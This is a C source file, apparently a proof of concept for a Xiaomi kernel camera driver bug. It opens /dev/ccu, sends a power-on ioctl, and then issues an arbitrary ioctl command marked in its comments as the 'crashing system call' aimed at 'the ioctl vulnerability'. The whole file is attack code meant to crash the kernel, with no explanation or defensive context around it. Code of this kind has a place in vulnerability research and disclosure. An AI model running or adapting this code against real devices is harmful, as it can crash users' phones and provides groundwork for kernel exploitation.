/* This is for xiaomi kernel */

#include <stdint-gcc.h>
#include "util.h" /* Contains syscall numbers and print functions */
//#include "msm_cam_sensor.h"
//#include "camera_isp.h"
//#include "ccu_drv.h"

#define DEVNAME "/dev/ccu"
char dev_name[] = DEVNAME;
char err_open_msg[] = "[-] error: could not open " DEVNAME "\n";
char err_write_msg[] = "[-] error: could not write to " DEVNAME "\n";
char open_msg[] = "[+] openning " DEVNAME "\n";
char ioctl_msg[] = "[+] doing ioctl on " DEVNAME "\n";
char success_open_msg[] = "open was successfull\n";

#define SIZE_32BYTE	(32)
#define SIZE_1MB	(1024*1024)
#define SIZE_1MB_PWR2PAGE   (8)
#define MAX_I2CBUF_NUM  1
#define MAX_MAILBOX_NUM 2
#define MAX_LOG_BUF_NUM 2

#define MAILBOX_SEND 0
#define MAILBOX_GET 1

struct ccu_working_buffer_s {
	uint8_t *va_pool;
	uint32_t mva_pool;
	uint32_t sz_pool;

	uint8_t *va_i2c;	/* i2c buffer mode */
	uint32_t mva_i2c;
	uint32_t sz_i2c;

	uint8_t *va_mb[MAX_MAILBOX_NUM];	/* mailbox              */
	uint32_t mva_mb[MAX_MAILBOX_NUM];
	uint32_t sz_mb[MAX_MAILBOX_NUM];

	char *va_log[MAX_LOG_BUF_NUM];	/* log buffer           */
	uint32_t mva_log[MAX_LOG_BUF_NUM];
	uint32_t sz_log[MAX_LOG_BUF_NUM];
	int32_t fd_log[MAX_LOG_BUF_NUM];
};

struct ccu_power_s {
	uint32_t bON;
	uint32_t freq;
	uint32_t power;
	struct ccu_working_buffer_s workBuf;
};



int main(int argc, char *argv[])
{
  long ret;
  dev_name[0] = 'd'; // So that .data page is mapped when we go into the system call

  print_self_memmap();

  //print_s(__FILE__ ": ISP_REGISTER_IRQ_USER_KEY = ");
  //print_int(ISP_REGISTER_IRQ_USER_KEY);
  //print_s("\n");

  /* Open the dev file that corresponds to the ioctl vulnerability */
  long fd;
  print_s("[+] openning " DEVNAME "\n");
  fd = syscall(__NR_open, DEVNAME, O_RDONLY);

  /* Check if succeeded, exit outherwise */
  if(fd == -1)
  {
    print_s("[-] error: could not open " DEVNAME "\n");
    syscall(__NR_exit, 0);
  }

  print_s("[+] Was able to open " DEVNAME "\n");

  /* Stage 1: setting values in ISP_REGISTER_USERKEY_STRUCT */
  //struct ISP_REGISTER_USERKEY_STRUCT param;
  //param.userKey = 0;
  //memcpy_alt(param.userName, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 32);

  //print_s("[+] Issuing system call on" DEVNAME ", param=0x");
  //print_hex((uint32_t)&param);
  //print_s("\n");


  /* Enable power */
  int CCU_IOCTL_SET_POWER=1074029312;
  struct ccu_power_s power;
  power.bON=1;
  syscall(__NR_ioctl, fd, CCU_IOCTL_SET_POWER, &power	);

  /* Crashing system call */
  int param = 0x12345678;
  //int CCU_READ_REGISTER = 3221512974;
  int MY_UNIQUE_CMD = 0x12345678;
  //syscall(__NR_ioctl, fd, CCU_READ_REGISTER, param);
  syscall(__NR_ioctl, fd, MY_UNIQUE_CMD, param);

  syscall(__NR_exit, 0);
}
